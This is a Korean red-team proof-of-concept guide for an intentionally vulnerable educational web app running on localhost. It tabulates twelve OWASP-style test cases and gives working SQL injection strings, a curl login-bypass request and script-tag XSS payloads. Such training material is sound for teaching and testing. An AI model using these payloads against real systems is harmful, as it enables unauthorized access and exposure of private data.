# Red Team PoC 가이드

> 본 문서는 `web/` 교육용 취약 앱과 허가된 테스트 환경에서만 사용한다.

## 실행 준비

```bash
cd web
source .venv/bin/activate
docker compose up -d postgres
alembic upgrade head
python -m app.seed
uvicorn app.main:app --reload
```

기본 URL은 `http://127.0.0.1:8000`이다. 일부 PoC는 시드 계정과 게시글 ID를 사용한다.

## PoC 목록

| ID | 유형 | 대상 | 핵심 기대 결과 |
| --- | --- | --- | --- |
| B-01 | Login SQL Injection | `POST /login` | 비밀번호 없이 `303 /posts` |
| B-02 | Search SQL Injection | `GET /posts?keyword=` | 비공개 게시글 링크 노출 |
| B-03 | Stored/Comment XSS | 게시글·댓글 | 상세 화면에 스크립트 삽입 |
| B-04 | Reflected XSS | 검색어 | 검색 결과에 스크립트 삽입 |
| B-05 | IDOR | `/posts/private/{id}` | user1이 user2 비공개 글 열람 |
| B-06 | Admin BAC | `/admin` | 일반 사용자 200 응답 |
| B-07 | Delete BAC | `POST /posts/{id}/delete` | 타인 글 삭제 |
| B-08 | Unrestricted Upload | `POST /upload` | 위험 확장자·MIME·크기 통과 |
| B-09 | Authentication Failures | 회원가입·로그인 | `1234` 가입, 반복 실패 후 로그인 |
| B-10 | Logging Failure | `/admin/security-events` | 공격 후에도 빈 목록 |
| B-11 | Exception Exposure | `/debug/*` | 예외·SQL·내부 경로 노출 |
| B-12 | Misconfiguration | `/docs`, 응답 헤더 | 문서 노출, CSP 등 누락 |

## 대표 수동 요청

### B-01 로그인 SQL Injection

```bash
curl -i -d "username=' OR '1'='1' --&password=x" \
  http://127.0.0.1:8000/login
```

### B-02 검색 SQL Injection → B-05 IDOR

1. `user1 / password123`로 로그인한다.
2. 검색어에 `') OR '1'='1' --`를 입력한다.
3. 결과에 나타난 user2 비공개 게시글을 누른다.
4. 소유자 검사 없이 본문이 노출되는지 확인한다.

### B-03/B-04 XSS

```html
<script>alert('stored-xss')</script>
<script>alert('comment-xss')</script>
<script>alert('reflected-xss')</script>
```

curl 결과에서는 escape되지 않은 페이로드 삽입을 확인하고, 실제 JavaScript 실행은
브라우저에서 alert 표시로 확인한다.

### B-08 파일 업로드

`test.html`, `test.svg`, `test.php`, `test.js`, `test.txt`를 업로드한다. 확장자·MIME Type·크기
제한 없이 목록에 표시되고 다운로드되는지 확인한다.

## 자동 PoC 실행

```bash
bash scripts/run-redteam-poc.sh
```

환경 변수로 대상 URL을 바꿀 수 있다.

```bash
BASE_URL=http://127.0.0.1:8001 bash scripts/run-redteam-poc.sh
```

## 전체 API

- API 목록: `web/docs/api-list.txt`
- 상세 요청·응답: `web/docs/api-docs.txt`
- OWASP 매트릭스: `web/docs/vulnerability-matrix.md`
